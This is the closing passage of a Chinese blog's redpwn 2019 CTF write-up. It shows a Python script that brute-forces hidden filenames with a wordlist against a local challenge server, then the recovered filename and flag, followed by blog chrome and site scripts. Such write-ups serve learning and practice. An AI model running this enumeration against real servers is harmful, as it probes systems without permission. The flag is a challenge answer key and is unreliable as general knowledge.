+<p>写脚本尝试进行遍历：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">with open(&quot;./words_alpha.txt&quot;) as fp:</span><br><span class="line">    words = fp.readlines()</span><br><span class="line">words = [word.strip() for word in words]</span><br><span class="line">for word in words:</span><br><span class="line">    print(word)</span><br><span class="line">    url = &quot;http://127.0.0.1:3000/u0tiI6DJlA1Zj9n2irnB/%s.txt&quot; % word</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    if &quot;Cannot&quot; not in r.text:</span><br><span class="line">        print(r.text)</span><br><span class="line">        break</span><br><span class="line">    r.close()</span><br><span class="line">    time.sleep(0.01)</span><br></pre></td></tr></table></figure></p>
+<p>得到最终的文件名和<code>flag</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">biscuits</span><br><span class="line">flag&#123;b15cu175_4r3_my_f4v0r173_k1nd_0f_c00k13&#125;</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+	
+	
+	
+		<div>    
+		 
+		 
+		<ul class="post-copyright">
+		  <li class="post-copyright-author">
+			  <strong>本文作者：</strong>Six
+		  </li>
+		  <li class="post-copyright-link">
+			<strong>本文链接：</strong>
+			<a href="/2019/09/12/redpwn-writeup/" title="redpwn writeup">2019/09/12/redpwn-writeup/</a>
+		  </li>
+		  <li class="post-copyright-license">
+			<strong>版权： </strong>
+			本站文章均采用 <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0 CN</a> 许可协议，请勿用于商业，转载注明出处！
+		  </li>
+		</ul>
+		
+		</div>
+	
+	
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
+          
+            <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
+          
+            <a href="/tags/Misc/" rel="tag"><i class="fa fa-tag"></i> Misc</a>
+          
+        </div>
+      
+	  
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/12/node2vec学习笔记/" rel="next" title="node2vec学习笔记">
+                <i class="fa fa-chevron-left"></i> node2vec学习笔记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Six</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">40</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">63</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/sy-yunyi" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="sky_yunyi@hotmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Cryptography"><span class="nav-number">1.</span> <span class="nav-text">Cryptography</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#superhash"><span class="nav-number">1.1.</span> <span class="nav-text">superhash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Dunce-Crypto"><span class="nav-number">1.2.</span> <span class="nav-text">Dunce Crypto</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Misc"><span class="nav-number">2.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#he-sed-she-sed"><span class="nav-number">2.1.</span> <span class="nav-text">he sed she sed</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#genericpyjail"><span class="nav-number">2.2.</span> <span class="nav-text">genericpyjail</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#genericpyjail2"><span class="nav-number">2.3.</span> <span class="nav-text">genericpyjail2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Tux-Trivia-Show"><span class="nav-number">2.4.</span> <span class="nav-text">Tux Trivia Show</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web"><span class="nav-number">3.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ghast"><span class="nav-number">3.1.</span> <span class="nav-text">ghast</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bluePrint"><span class="nav-number">3.2.</span> <span class="nav-text">bluePrint</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#red-pwn-is"><span class="nav-number">3.3.</span> <span class="nav-text">red-pwn-is</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Cookie-Recipes"><span class="nav-number">3.4.</span> <span class="nav-text">Cookie Recipes</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Six</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1275813462'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s23.cnzz.com/z_stat.php%3Fid%3D1275813462%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'dIoFImKfwRTGKnNvmvMB4ukn-gzGzoHsz',
+        appKey: 'I8zDh9Pv5SxLpr0e3gQ86gQx',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
